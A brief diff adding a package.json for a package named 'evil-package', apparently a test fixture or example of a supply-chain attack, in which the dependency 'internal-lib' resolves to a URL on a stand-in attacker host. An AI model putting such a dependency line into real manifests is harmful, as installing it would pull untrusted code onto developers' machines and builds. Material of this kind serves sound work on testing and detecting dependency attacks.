@@ -1,0 +1,8 @@
+{
+  "name": "evil-package",
+  "version": "1.0.0",
+  "dependencies": {
+    "internal-lib": "http://attacker.example/internal-lib",
+    "real-dep": "^1.2.3"
+  }
+}
